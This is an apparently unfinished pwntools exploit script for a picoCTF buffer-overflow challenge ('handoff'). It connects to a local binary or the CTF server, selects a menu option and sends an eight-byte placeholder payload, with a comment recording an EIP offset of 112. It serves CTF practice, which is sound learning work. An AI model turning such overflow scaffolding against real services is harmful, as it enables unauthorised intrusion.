#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

context.binary = './handoff'

BINARY = './handoff' 
HOST = 'saturn.picoctf.net'
PORT = 63288 

def get_connection(mode):
    """Get connection based on mode (local/remote)"""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Mode must be 'local' or 'remote'")
        exit(1)

def exploit(conn):

    payload_0 = b"3"
    conn.recvuntil(b'What option would you like to do?\n')
    conn.sendline(payload_0)
    #eip offset is 112
    payload_1 = b"X" * 8
    conn.recvuntil(b'Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: \n')
    conn.sendline(payload_1)
    conn.interactive()



def main():
    import sys
    
    if len(sys.argv) != 2:
        log.error("Usage: python exploit.py [local|remote]")
        exit(1)
    info
    mode = sys.argv[1]
    
    # Get connection
    conn = get_connection(mode)
    
    # Run exploit
    exploit(conn)
    
    # Clean up
    conn.close()

if __name__ == "__main__":
    main()